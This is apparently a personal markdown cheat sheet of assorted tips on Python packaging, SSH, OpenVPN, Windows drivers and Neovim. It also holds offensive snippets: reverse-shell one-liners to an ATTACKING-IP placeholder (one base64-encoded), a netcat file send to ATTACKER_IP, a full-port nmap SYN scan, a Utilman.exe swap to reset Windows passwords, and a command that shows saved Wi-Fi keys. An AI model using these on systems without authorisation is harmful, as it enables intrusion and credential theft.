# Tip-pipenv-poetry >[!CHECK]
**Use pipenv with poetry for python packaging-management and version control**
- first use pipenv to create a virtual project inside the folder with a python version different that the system one
- use poetry for packages control and use the env POETRY_VIRTUALENVS_PREFER_ACTIVE_PYTHON=True for this to work merely correctly; also need to activate the shell of pipenv and a child shell for poetry

---

# Create App Password on google Account
- Log in to the account, go to manage account, security, activate 2 steps authentication, and use this link if cannot see 
- [Create app password function](https://myaccount.google.com/apppasswords)

---

# A litle bit of NMAP
- a basic scan for all 65535 ports looking for open ones:
`nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn {IP} -oG allPorts`

---

# Read .db files using python
- `python -c "import sqlite3; print(sqlite3.connect('database_name.db').cursor().execute('SELECT * FROM table_name').fetchall())"`

---

# Netcat
- Listen `nc -vnl -s HOST -p PORT`
- Copy CLIENT `nc -w 3 ATTACKER_IP ATTACKER_PORT < [file_to_download] SERVER nc -l -s HOST -p PORT > [path_to_save]`

---

# Bash connects
- Connections `"/bin/bash -c 'bash -i >& /dev/tcp/ATTACKING-IP/PORT 0>&1'"`
- Encripted `echo "bash -i >& /dev/tcp/<your-ip>/<your-port> 0>&1" | base64 -w 0`

---

# Read json in bash with python
- `curl -s 'https://api.github.com/users/lambda' | \
    python3 -c "import sys, json; print(json.load(sys.stdin)['name'])"`

---

# Read json in bash with jq
- `curl -s 'https://api.github.com/users/lambda' | jq -r '.name'`

---

# Python PSEUDOshell
- `python -c 'import pty; pty.spawn("/bin/bash")'`

---

# SSH forwarding
- `ssh -D [LOCALADDR:]LOCALPORT -N(just forward connections) -C(compress(better-on-slow-networks)) user@ip`

---

# Create a service in linux
```
[Unit]
Description=Shadowsocks proxy server
Requires
After

[Service]
Type
RemainAfterExit
User=root
Group=root
Type=simple
WorkingDirectory
ExecStart=/usr/local/bin/ss-server -c /etc/shadowsocks/shadowsocks.json -a shadowsocks -v start
ExecStop=/usr/local/bin/ss-server -c /etc/shadowsocks/shadowsocks.json -a shadowsocks -v stop
TimeoutStartSec

[Install]
WantedBy=multi-user.target
```

---

# Make NVIM remember last cursor position (pure lua)
```
local group = vim.api.nvim_create_augroup("jump_last_position", { clear = true })
vim.api.nvim_create_autocmd(
	"BufReadPost",
	{callback = function()
			local row, col = unpack(vim.api.nvim_buf_get_mark(0, "\""))
			if {row, col} ~= {0, 0} then
				vim.api.nvim_win_set_cursor(0, {row, 0})
			end
		end,
	group = group
	}
)
```

---

# Bypass Out Of the Box Experience (windows 11 Internet Requirement)
- In the 'Let's connect you to a network' screen, press `shift+F10` to launch cmd
- Type the following command: `OOBE\BYPASSNRO`
- After the successful execution the system should restart.

---

# Wlan profiles clear in Windows
- `netsh`
- `netsh wlan`
- `show profiles ssid key="clear"`

---

# Recover password on windows without reinstall
- On login windows press and hold shift and reboot the pc. Then recovery window will pop up, enter to troubleshooting,
- advanced options, command prompt. Then:
1. copy C:\Windows\System32\Utilman.exe C:\Windows\System32\Utilman.exebak
2. copy C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe /y
- Reboot again. On login screen got to accessibility press it and a command prompt will appear:
3. net localgroup administrastors
- The list of account shows up, select the one to reset its password:
4. net user your_username *
- Change the password and done.
*Don't forget to restore utilman to its original state*

---

# PROMISC mode on linux
```
auto eth1
iface eth1 inet manual
  up ifconfig $IFACE 0.0.0.0 up
  up ip link set $IFACE promisc on
  down ip link set $IFACE promisc off
  down ifconfig $IFACE down
```

---

# On windows, free port range that are in use
- discovery the ports
`netsh interface ipv4 show excludedportrange protocol=tcp`
- release the ports
`net stop winnat`

---

# Use ssh keys with ssh-config-file
- generate the key pair with ssh
`ssh-keygen -t ed25519 -C "a comment"`
- create a config file inside the .ssh folder that follows this schema:
```
Host name-of-the-configuration
  HostName  gitlab/github.com/ip/hostname
  User git/remote-host-username
  PreferredAuthentications publickey
  IdentifyFile path/to/private/identity/file
```
Configure the remote host with the public ssh key generated

---

# Openvpn as linux service
- Configure openvpn:
    install openvpn, openvpn-systemd-resolved, openresolv
`sudo wget "https://raw.githubusercontent.com/ProtonVPN/scripts/master/update-resolv-conf.sh" -O "/etc/openvpn/update-resolv-conf"`
`sudo chmod +x "/etc/openvpn/update-resolv-conf"`
- save the openvpn server config file into /etc/openvpn as openvpn.conf
- save the credentials in the first two lines of a textplain file called auth.txt with chmod 400. Put it in /etc/openvpn
- Add/edit this lines in the openvpn.conf file created
`auth-user-pass auth.txt`
`status /etc/openvpn/openvpn-status.log`
`log /etc/openvpn/openvpn.log`

---

# Check windows version from an ISO
- run:
  ```bash
  DISM /get-wiminfo /wimfile:"X:\sources\install.wim" /index:1
  ```
`X` is the driver letter

---

# Windows drivers backup-restore
-> [DOCS](https://www.tenforums.com/tutorials/68426-backup-restore-device-drivers-windows-10-a.html)
## Back Up All Device Drivers in Command Prompt
```bash
dism /online /export-driver /destination:"full path of folder"
```
## Back Up All Device Drivers in PowerShell
```bash
Export-WindowsDriver -Online -Destination "full path of folder"
```
## Restore a Device Driver Backup in Device Manager
## Restore All Device Drivers in Command Prompt
```bash
pnputil /add-driver "full path of folder\*.inf" /subdirs /install /reboot
```

---

# List ports in use in linux
```shell
sudo lsof -i -P -n
```


### EOF ###
